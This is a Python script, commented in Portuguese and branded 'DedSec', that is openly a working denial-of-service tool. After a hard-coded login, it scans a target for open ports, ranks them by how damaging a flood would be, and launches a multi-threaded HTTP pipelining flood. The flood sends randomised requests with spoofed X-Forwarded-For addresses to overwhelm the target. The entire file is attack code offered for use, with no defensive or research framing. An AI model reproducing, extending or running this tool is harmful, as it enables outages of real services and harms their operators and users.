import socket
import threading
import time
import sys
import random
import os
import signal
from optparse import OptionParser
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor

# Inicialização do ambiente
init(autoreset=True)

# --- Configurações Globais ---
bots = [
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
    "https://www.google.com/search?q=",
    "https://check-host.net/check-report?host=",
    "https://www.bing.com/search?q="
]

uagents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/114.0 Firefox/114.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15"
]

# --- Sistema de Controle ---
def panic_button(sig, frame):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\n{Fore.RED}[!] PANIC BUTTON ACTIVATED - Session Cleared.")
    print(f"{Fore.WHITE}Join us. Join DedSec.")
    sys.exit(0)

signal.signal(signal.SIGINT, panic_button)

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Fore.GREEN}    ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗
{Fore.GREEN}    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
{Fore.WHITE}    ██║  ██║█████╗  ██║  ██║███████╗█████╗  ██║     
{Fore.WHITE}    ██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║     
{Fore.GREEN}    ██████╔╝███████╗██████╔╝███████║███████╗╚██████╗
{Fore.GREEN}    ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝
{Fore.WHITE}             DDoS ATTACK - ELITE INTELLIGENCE TOOL
    
{Fore.CYAN}    [+] Operation: DedSec_DDoS Atack
{Fore.CYAN}    [+] Base: NetSTRIK by K I V Y | Evolution: VertzDevSec
{Fore.CYAN}    [+] System: Multi-Threaded Pipelining Flood
{Fore.YELLOW}    ----------------------------------------------------------------------
    """)

def authenticate():
    show_banner()
    print(f"{Fore.YELLOW}[*] DedSec Security - Login required")
    while True:
        user = input(f"{Fore.BLUE}ID: {Style.RESET_ALL}").strip()
        pw = input(f"{Fore.BLUE}PW: {Style.RESET_ALL}").strip()
        if user == "dedsec" and pw == "dedsec":
            print(f"{Fore.GREEN}\n[+] Acesso liberado, bem vindo Agente...\n")
            time.sleep(1)
            break
        print(f"{Fore.RED}[!] Tentativa de acesso não autorizado registrada.")

# --- Lógica de Ataque (Pipelining) ---
def carregar_headers():
    """Lê o arquivo headers.txt e retorna uma lista de cabeçalhos."""
    try:
        with open("headers.txt", "r") as f:
            # Filtra linhas vazias e remove espaços em branco
            headers = [linha.strip() for linha in f.readlines() if linha.strip()]
            return headers
        # Se o arquivo estiver no repositório, o script o encontrará automaticamente
    except FileNotFoundError:
        # Fallback caso o arquivo não seja encontrado
        return ["Accept: text/html", "Connection: keep-alive", "Accept-Language: pt-BR"]

# Carrega a lista global de headers uma única vez ao iniciar
LISTA_HEADERS = carregar_headers()

def down_it(id_worker, target_host, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(4)
            s.connect((target_host, int(target_port)))
            
            # Realiza o Pipelining enviando múltiplas requisições por conexão
            for _ in range(50):
                # Escolhe um cabeçalho aleatório do arquivo headers.txt
                header_aleatorio = random.choice(LISTA_HEADERS)
                
                # Gera um IP falso para o cabeçalho X-Forwarded-For
                fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                # Monta a requisição usando o header carregado do arquivo
                packet = (
                    f"GET /?{random.getrandbits(32)} HTTP/1.1\r\n"
                    f"Host: {target_host}\r\n"
                    f"{header_aleatorio}\r\n"
                    f"X-Forwarded-For: {fake_ip}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode('utf-8')
                
                s.sendall(packet)
            
            sys.stdout.write(f"{Fore.GREEN}[DEDSEC_{id_worker:03d}] INUNDANDO -> {target_host}:{target_port}\r")
        except:
            sys.stdout.write(f"{Fore.RED}[DEDSEC_{id_worker:03d}] ALVO SATURADO / CONEXÃO RECUSADA\r")
            time.sleep(0.1)
        finally:
            s.close()

# --- Main Flow ---
if __name__ == '__main__':
    authenticate()
    
    # Coleta de Alvo
    show_banner()
    host = input(f"{Fore.CYAN}[?] Digite o IP/URL do Alvo: ").strip()
    try:
        thr = int(input(f"{Fore.CYAN}[?] Quantidade de Threads (Sugerido 135-300): "))
    except ValueError:
        sys.exit(f"{Fore.RED}[!] Erro: Threads devem ser números.")

    # Scanner Inteligente
    print(f"\n{Fore.YELLOW}[*] Iniciando Escaneamento DedSec em {host}...")
    services = {
        53: (f"{Fore.RED}[CRÍTICO]{Fore.WHITE} DNS - Pode derrubar a conectividade total"),
        80: (f"{Fore.YELLOW}[MÉDIO] {Fore.WHITE} HTTP - Ideal para flood de aplicação"),
        443: (f"{Fore.YELLOW}[MÉDIO] {Fore.WHITE} HTTPS - Exige alto processamento do alvo"),
        1900: (f"{Fore.RED}[CRÍTICO]{Fore.WHITE} UPnP - Vulnerabilidade de Kernel de Roteador"),
        3306: (f"{Fore.BLUE}[BAIXO]  {Fore.WHITE} MySQL - Afeta banco de dados")
    }

    open_ports = []
    for p in [53, 80, 443, 1900, 3306, 8080]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.2)
        if sock.connect_ex((host, p)) == 0:
            info = services.get(p, "Serviço Adicional")
            print(f"{Fore.GREEN}[+] Porta {p: <5} Aberta -> {info}")
            open_ports.append(p)
        sock.close()

    if not open_ports:
        print(f"{Fore.RED}[!] Nenhuma porta vulnerável comum encontrada.")
        port = int(input(f"{Fore.CYAN}[?] Digite a porta alvo manualmente: "))
    else:
        port = int(input(f"\n{Fore.BLUE}[?] Selecione a porta para a operação: "))

    # Início da Operação
    show_banner()
    print(f"{Fore.WHITE} STATUS DA MISSÃO:")
    print(f"{Fore.GREEN} TARGET   : {Fore.WHITE}{host}:{port}")
    print(f"{Fore.GREEN} POWER    : {Fore.WHITE}{thr} Workers ativos")
    print(f"{Fore.GREEN} METHOD   : {Fore.WHITE}HTTP Pipelining Flood")
    print(f"{Fore.RED} [!] PRESS CTRL+C TO STOP OPERATION")
    print(f"{Fore.YELLOW} ----------------------------------------------------------------------\n")

    with ThreadPoolExecutor(max_workers=thr) as executor:
        for i in range(thr):
            executor.submit(down_it, i, host, port)